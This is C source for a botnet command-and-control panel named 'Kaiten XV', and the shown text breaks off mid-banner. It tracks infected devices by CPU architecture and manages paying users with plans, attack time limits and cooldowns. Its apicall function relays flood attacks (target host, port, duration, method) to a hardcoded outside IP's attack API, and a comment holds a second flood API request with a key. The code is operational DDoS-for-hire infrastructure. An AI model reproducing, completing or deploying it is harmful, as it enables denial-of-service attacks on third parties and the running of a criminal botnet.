#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define userfile "users/login.txt"
#define MAXFDS 1000000
#define LOGINTRIGGER "ktn"
char *apiip = "http://45.41.241.72:999"; // test

char user_ip[100];
char *ipinfo[800];
char usethis[2048];   //////
char usethis2[2048];   //////
char usethis3[2048];   //////
char botnet[2048];     //////
char motd[512];
int loggedin = 1;
int logoutshit;
int sent = 0;
int motdaction = 1;
int Attacksend = 0;
int AttackStatus = 0;
int userssentto;
int msgoff;
int captcano = 1; // test
int logintrigger = 1; // test
char broadcastmsg[800];

const char *slashes[] = {"|", "/", "-", "\\"};

struct login {
	char username[100];
	char password[100];
	char admin[50];
    char expirydate[100];
    int cooldown_timer;
    int cooldown;
    int maxtime;
};
static struct login accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char ARM;
		char mips;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
		char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
    char my_ip[100];
    char id[800];
    char planname[800];
    int mymaxtime;
    int mycooldown;
    int listenattacks;
    int cooldownstatus;// Cool Down Thread Status
    int cooldownsecs;// Cool Down Seconds Left
    int msgtoggle;// Toggles Recieving messages
    int broadcasttoggle;// Toggles Broadcast Toggle
    int LoginListen;
} managements[MAXFDS];

struct CoolDownArgs{
    int sock;
    int seconds;
};

struct toast {
    int login;
    int just_logged_in;
} gay[MAXFDS];


FILE *LogFile2;
FILE *LogFile3;

static volatile FILE *ticket;   //ticket system 1
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;

void StartCldown(void *arguments)
{
	struct CoolDownArgs *args = arguments;
	int fd = (int)args->sock;
	int seconds = (int)args->seconds;
	managements[fd].cooldownsecs = 0;
	time_t start = time(NULL);
	if(managements[fd].cooldownstatus == 0)
		managements[fd].cooldownstatus = 1;
	while(managements[fd].cooldownsecs++ <= seconds) sleep(1);
	managements[fd].cooldownsecs = 0;
	managements[fd].cooldownstatus = 0;
	return;
}


int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}

/*
void timeconnected(void *sock)
{
	char sadtimes[800];
	char datafd = (int)sock;
	char seconds = 7200;
	char closesecs = 0;
	while(seconds-- >= closesecs)
	{
		if(seconds == 1000)
		{
			sprintf(sadtimes, "\r\n\e[1;37mYou Have 30 Minutes Before You Will Be Logged Out!\r\n")
			send(datafd, sadtimes strlen(sadtimes), MSG_NOSIGNAL);
			sprintf(sadtimes, "\r\n\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
			send(datafd, sadtimes strlen(sadtimes), MSG_NOSIGNAL);
		}
		else if(seconds = 300)
		{
			sprintf(sadtimes, "\r\n\e[1;37mYou Have 5 Minutes Before You Will Be Logged Out!\r\n")
			send(datafd, sadtimes strlen(sadtimes), MSG_NOSIGNAL);
			sprintf(sadtimes, "\r\n\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
			send(datafd, sadtimes strlen(sadtimes), MSG_NOSIGNAL);
		}
	}
}

//   WHAT THE FUCKKKK AUTO LOGOUT IF THE NET HAS BEEN ON STANDBY FOR 1 HOUR OF INACTIVITY XD XD XD XD SUPER CODER HAKKAR MANNNNNNNNN
*/

static int check_expiry(const int fd) // if(year > atoi(my_year) || day > atoi(my_day) && month >= atoi(my_month) && year == atoi(my_year) || month > atoi(my_month) && year >= atoi(my_year))
{
    time_t t = time(0);
    struct tm tm = *localtime(&t);
    int day, month, year, argc = 0;
    day = tm.tm_mday; //
    month = tm.tm_mon + 1;
    year = tm.tm_year - 100;
    char *expirydate = calloc(strlen(accounts[fd].expirydate), sizeof(char));
    strcpy(expirydate, accounts[fd].expirydate);

    char *args[10 + 1];
    char *p2 = strtok(expirydate, "/");

    while(p2 && argc < 10) 
    {
        args[argc++] = p2;
        p2 = strtok(0, "/"); 
    }

    if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))
        return 1;
    return 0; 
}


int checkaccounts()
{
	FILE *file;
	if((file = fopen("users/login.txt","r")) != NULL)
	{
		fclose(file);
	} else {
		char checkaccuser[80], checkpass[80];
		printf("Username:");
		scanf("%s", checkaccuser);
		printf("Password:");
		scanf("%s", checkpass);
		char reguser[80];
		char thing[80];
		sprintf(thing, "%s %s Admin 1200 0 99/99/9999");
		sprintf(reguser, "echo '%s' >> users/login.txt", thing);
		system(reguser);
		printf("login.txt was Missing It has Now Been Created\r\nWithout this the screen would crash instantly\r\n");
	}
}
int checklog()
{
	FILE *logs1;
	if((logs1 = fopen("logs/", "r")) != NULL)
	{
		fclose(logs1);
	} else {
		char mkdir[80];
		strcpy(mkdir, "mkdir logs");
		system(mkdir);
		printf("Logs Directory Was Just Created\r\n");
	}
	FILE *logs2;
	if((logs2 = fopen("logs/IPBANNED.txt", "r")) != NULL)
	{
		fclose(logs2);
	} else {
		char makeipbanned[800];
		strcpy(makeipbanned, "cd logs; touch IPBANNED.txt");
		system(makeipbanned);
		printf("IPBANNED.txt Was Not In Logs... It has been created\r\nWithout This File The C2 would crash the instant you open it\r\n");
	}
	FILE *logs3;
	if((logs3 = fopen("logs/BANNEDUSERS.txt", "r")) != NULL)
	{
		fclose(logs3);
	} else {
		char makeuserbanned[800];
		strcpy(makeuserbanned, "cd logs; touch BANNEDUSERS.txt");
		system(makeuserbanned);
		printf("BANNEDUSERS.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you put your Username And Password In\r\n");
	}
	FILE *logs4;
	if((logs4 = fopen("logs/Blacklist.txt", "r")) != NULL)
	{
		fclose(logs4);
	} else {
		char makeblacklist[800];
		strcpy(makeblacklist, "cd logs; touch Blacklist.txt");
		system(makeblacklist);
		printf("Blacklist.txt Was Not In Logs... It Has Been Created\r\nWithout This File The C2 would crash the instant you Send An Attack\r\n");
	}
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}
int apicall(char *type, char *ip, char *port, char *time, char *method)
{
    int Sock = -1;
    char request[1024];
    char host_ipv4[20];
    struct sockaddr_in s;
    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 3;
    Sock = socket(AF_INET, SOCK_STREAM, 0);
    s.sin_family = AF_INET;
    s.sin_port = htons(80);
    s.sin_addr.s_addr = inet_addr(apiip);
    if(strstr(type, "spoofed")) // add more or change to whatever u want
    { 
        snprintf(request, sizeof(request), "GET /api/attack?username=modo&secret=testkey&host=%s&port=%s&time=%s&method=%s HTTP/1.1\r\nHost: %s\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\r\nConnection: close\r\n\r\n", ip, port, time, method, apiip);
    }
    connect(Sock, (struct sockaddr *)&s, sizeof(s));
    send(Sock, request, strlen(request), 0); // try now
    return 0;
}
// GET /sst/api?service=flood&key=loppvgo3dabq32a&host=%s&port=%s&time=%s&method=%s&network=1 HTTP/1.1\r\nHost: %s\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\r\nConnection: close\r\n\r\n", ip, port, time, method, apiip);
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
    int i;

    for(i = 0; i < MAXFDS; i++)
    {
        if(clients[i].connected >= 1)
        {
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, "\n", 1, MSG_NOSIGNAL);
        }
    }
}



void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							clients[infd].connected--;
							dup = 1;
							break;
						}
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf("BOT:\"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users/login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
    int datafd = (int)sock;
    char string[2048];
    int i;  // Declare 'i' outside the loop
    char spinningChars[] = "/-\\|";
    int charIndex = 0;

    while (1) {
        memset(string, 0, 2048);
        if (gay[datafd].login == 2) {
            sprintf(string, "%c]0; Welcome To Kaiten XV: Type [ktn] To Enter! %c", '\033', '\007');
        } else {
            if (managements[datafd].cooldownstatus == 1) {
                sprintf(string, "%c]0; [Servers Online: %d] |/| [User: %s] |/| [Plan: %s] |/| [Cooldown: %d]%c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
            }
            if (motdaction == 1 && managements[datafd].cooldownstatus == 0) {
                char tempString[2048];  // Create a temporary string for appending
                strcpy(tempString, "");
                for (i = 0; i < sizeof(slashes) / sizeof(slashes[0]); i++) {
                    char spinChar = spinningChars[charIndex];
                    char spinString[256];
                    sprintf(spinString, "%c]0; %c[Servers Online: %d] [Live: %s] [Expiry: %s] [Plan: %s]%c", '\033', spinChar, botsconnect(), motd, accounts[datafd].expirydate, managements[datafd].planname, '\007');
                    strcat(tempString, spinString);  // Append to the temporary string
                }
                // Now, assign the final string
                strcpy(string, tempString);

                // Update the character index for spinning
                charIndex = (charIndex + 1) % strlen(spinningChars);
            }
        }
        if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1)
            return;
        usleep(2000000);
    }
}



       
void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    gay[datafd].login = 2;
    pthread_create(&title, NULL, &TitleWriter, sock);
    char buf[2048];
	char* username;
	char* password;
	char* admin = "admin";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
	
	FILE *fp;
	int i=0;
	int c;
	fp=fopen("users/login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %d %d %s", accounts[j].username, accounts[j].password, accounts[j].admin, &accounts[j].maxtime, &accounts[j].cooldown, accounts[j].expirydate);
		++j;
		
	}	

		char *line1 = NULL;
        size_t n1 = 0;
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, "\e[1;31mSTOP RIGHT THERE! You have been banned :(\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f1);
        free(line1);

        char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
        if(logintrigger == 1)
        {
            if(fdgets(buf, sizeof(buf), datafd) > 2);
            trim(buf);
            send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL);
            if(!strcmp(buf, LOGINTRIGGER))
            {
                if(captcano == 1)
                {
                    goto catpchaprompt;
                }
                else
                {
                    goto loginprompt;
                }

            }
            else
            {
                goto end;
            }
        }
        else
        {
            goto loginprompt;
        }

catpchaprompt:
        memset(buf, 0, sizeof(buf));
        int catpcha_number = rand() % 100000;
        char sendcatpcha[1024];
        sprintf(sendcatpcha, "Captcha(%d)\r\nPlease Enter The Number Displayed: ", catpcha_number);
        send(datafd, sendcatpcha, strlen(sendcatpcha), MSG_NOSIGNAL);
        if(fdgets(buf, sizeof(buf), datafd) > 2);
        trim(buf);
        printf("test: %s length: %d\n", buf, strlen(buf));
        if(atoi(buf) == catpcha_number)
            goto loginprompt;
        else
            goto end;
loginprompt:
		/*char clearscreen [2048];
		memset(clearscreen, 0, 2048);*/
		sprintf(clearscreen, "\033[2J\033[1;1H");
        {
        char login1  [5000];
        char login2  [5000];
        char login3  [5000];
        char login4  [5000];
        char login5  [5000];
        char login6  [5000];
        char login7  [5000];
        char login8  [5000];
        char login9  [5000];
        char login10 [5000];
        char login11 [5000];
		char username [5000];

		sprintf(login1,    "\r\n");
		sprintf(login2,    "\t\t       \e[38;2;255;0;211m╔═══\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═╗\r\n");
		sprintf(login3,    "\t\t       \e[38;2;255;0;211m║   \e[38;2;227;27;216m ╦╔═\e[38;2;199;53;221m╔═╗╦\e[38;2;171;80;226m╔╦╗╔\e[38;2;143;106;231m═╗╔╗\e[38;2;116;133;235m╔   \e[38;2;88;159;240m ║ \r\n");
		sprintf(login4,    "\t\t       \e[38;2;255;0;211m║   \e[38;2;227;27;216m ╠╩╗\e[38;2;199;53;221m╠═╣║\e[38;2;171;80;226m ║ ║\e[38;2;143;106;231m╣ ║║\e[38;2;116;133;235m║   \e[38;2;88;159;240m ║\r\n");
		sprintf(login5,    "\t\t       \e[38;2;255;0;211m║   \e[38;2;227;27;216m ╩ ╩\e[38;2;199;53;221m╩ ╩╩\e[38;2;171;80;226m ╩ ╚\e[38;2;143;106;231m═╝╝╚\e[38;2;116;133;235m╝XV \e[38;2;88;159;240m ║\r\n");
		sprintf(login6,    "\t\t       \e[38;2;255;0;211m╠═══\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═╣\r\n");
		sprintf(login7,    "\t\t       \e[38;2;255;0;211m║\e[1;37mWelcome To kaiten XV....\e[38;2;143;106;231m║\r\n");
		sprintf(login8,    "\t\t       \e[38;2;255;0;211m║\e[1;37mCoded By: Komodo........\e[38;2;143;106;231m║\r\n");
		sprintf(login9,    "\t\t       \e[38;2;255;0;211m║\e[1;37mDate Created: 21/07/2021\e[38;2;143;106;231m║ \r\n");
		sprintf(login10,   "\t\t       \e[38;2;255;0;211m╚════════════════════════\e[38;2;143;106;231m╝\r\n");
		sprintf(login11,   "\r\n");
        sprintf(username, "\e[1;37m[Username]:\e[38;2;0;0;0m", accounts[find_line].username);
        
        if(send(datafd, login1, strlen(login1),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login2, strlen(login2),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login3, strlen(login3),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login4, strlen(login4),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login5, strlen(login5),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login6, strlen(login6),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login7, strlen(login7),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login8, strlen(login8),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login9, strlen(login9),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login10, strlen(login10),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, login11, strlen(login11),MSG_NOSIGNAL)== -1) goto end;
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[30];
        strcpy(nickstring, buf);
	    memset(buf, 0, sizeof(buf));
	    find_line = Find_Login(nickstring);
        memset(buf, 0, 2048);

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char pass1  [5000];
        char pass2  [5000];
        char pass3  [5000];
        char pass4  [5000];
        char pass5  [5000];
        char pass6  [5000];
        char pass7  [5000];
        char pass8  [5000];
        char pass9  [5000];
        char pass10 [5000];
        char pass11 [5000];
		char password [5000];

		sprintf(pass1,    "\r\n");
		sprintf(pass2,    "\t\t       \e[38;2;255;0;211m╔═══\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═╗\r\n");
		sprintf(pass3,    "\t\t       \e[38;2;255;0;211m║   \e[38;2;227;27;216m ╦╔═\e[38;2;199;53;221m╔═╗╦\e[38;2;171;80;226m╔╦╗╔\e[38;2;143;106;231m═╗╔╗\e[38;2;116;133;235m╔   \e[38;2;88;159;240m ║ \r\n");
		sprintf(pass4,    "\t\t       \e[38;2;255;0;211m║   \e[38;2;227;27;216m ╠╩╗\e[38;2;199;53;221m╠═╣║\e[38;2;171;80;226m ║ ║\e[38;2;143;106;231m╣ ║║\e[38;2;116;133;235m║   \e[38;2;88;159;240m ║\r\n");
		sprintf(pass5,    "\t\t       \e[38;2;255;0;211m║   \e[38;2;227;27;216m ╩ ╩\e[38;2;199;53;221m╩ ╩╩\e[38;2;171;80;226m ╩ ╚\e[38;2;143;106;231m═╝╝╚\e[38;2;116;133;235m╝XV \e[38;2;88;159;240m ║\r\n");
		sprintf(pass6,    "\t\t       \e[38;2;255;0;211m╠═══\e[38;2;227;27;216m════\e[38;2;199;53;221m════\e[38;2;171;80;226m════\e[38;2;143;106;231m════\e[38;2;116;133;235m════\e[38;2;88;159;240m═╣\r\n");
		sprintf(pass7,    "\t\t       \e[38;2;255;0;211m║\e[1;37mWelcome To kaiten XV....\e[38;2;143;106;231m║\r\n");
		sprintf(pass8,    "\t\t       \e[38;2;255;0;211m║\e[1;37mCoded By: Komodo........\e[38;2;143;106;231m║\r\n");
		sprintf(pass9,    "\t\t       \e[38;2;255;0;211m║\e[1;37mDate Created: 21/07/2021\e[38;2;143;106;231m║ \r\n");
		sprintf(pass10,   "\t\t       \e[38;2;255;0;211m╚════════════════════════\e[38;2;143;106;231m╝\r\n");
		sprintf(pass11,   "\r\n");
        sprintf(password,  "\e[1;37m[Password]:\e[38;2;0;0;0m", accounts[find_line].password);

        if(send(datafd, pass1, strlen(pass1),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass2, strlen(pass2),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass3, strlen(pass3),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass4, strlen(pass4),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass5, strlen(pass5),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass6, strlen(pass6),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass7, strlen(pass7),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass8, strlen(pass8),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass9, strlen(pass9),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass10, strlen(pass10),MSG_NOSIGNAL)== -1) goto end;
        if(send(datafd, pass11, strlen(pass11),MSG_NOSIGNAL)== -1) goto end;
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;        
        char passwordl[800];
        trim(buf);
        strcpy(passwordl, buf);
        memset(buf, 0, 2048);
		
		char *line2 = NULL;
        size_t n2 = 0;
        FILE *f2 = fopen("logs/BANNEDUSERS.txt", "r");
            while (getline(&line2, &n2, f2) != -1){
                if (strstr(line2, nickstring) != NULL){
                    if(send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
                    sprintf(usethis, "\e[1;31mSTOP RIGHT THERE! You have been banned :(\r\n");
                    if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) return;                    
                    sleep(5);
                    goto end;
            }
        }
        fclose(f2);
        free(line2);

        if(strcmp(accounts[find_line].username, nickstring) != 0 || strcmp(accounts[find_line].password, passwordl) != 0){ goto failed;}
        if(strcmp(accounts[find_line].username, nickstring) == 0 || strcmp(accounts[find_line].password, passwordl) == 0)
        { 
        	int toast;
        	for(toast=0;toast < MAXFDS;toast++){
            	if(!strcmp(managements[toast].id, nickstring))
            	{
            		char bad[800];
            		sprintf(bad, "\e[1;36mUser %s Is Already Logged In\r\n", nickstring);
            		if(send(datafd, bad, strlen(bad), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n\e[1;31mMessage From Kaiten C2:\r\nSomeone Tried To Login To Your Account Contact An Admin\r\n");
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", nickstring);
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		memset(nickstring, 0, sizeof(nickstring));
            		memset(passwordl, 0, sizeof(passwordl));
            		sleep(5);
            		goto end;
            	}
        	}
/*


1 - Blue (original): \e[38;2;0;0;255m

2 - Light blue: \e[38;2;128;128;255m

3 - Light purple: \e[38;2;192;128;255m

4 - Purple: \e[38;2;128;0;128m

5 - Light pink: \e[38;2;255;128;192m

6 - White (final): \e[38;2;255;255;255m

*/
        	char gya[800];

        	sprintf(gya, "\033[2J\033[1;1H");
        	if(send(datafd, gya, strlen(gya), MSG_NOSIGNAL) == -1) goto end;
            
            char tos0[800];
        	char tos1[800];
        	char tos2[800];
        	char tos3[800];
        	char tos4[800];
        	char tos5[800];
        	char tos6[800];
        	char tos7[800];
        	char tos8[800];
        	char tos9[800];
        	char tos10[800];
        	char tos11[800];

        	sprintf(tos0,  "\r\n");
        	sprintf(tos1,  "\t\e[1;36m   ╔════════════════════════════════════════════════════════╗\r\n");  
			sprintf(tos2,  "\t\e[1;36m   ╚══╗                                                  ╔══╝\r\n"); 
			sprintf(tos3,  "\t\e[1;36m      ║\e[1;37mKaiten LTD. Is NOT Responsible For Your Actions   \e[1;36m║\r\n"); 
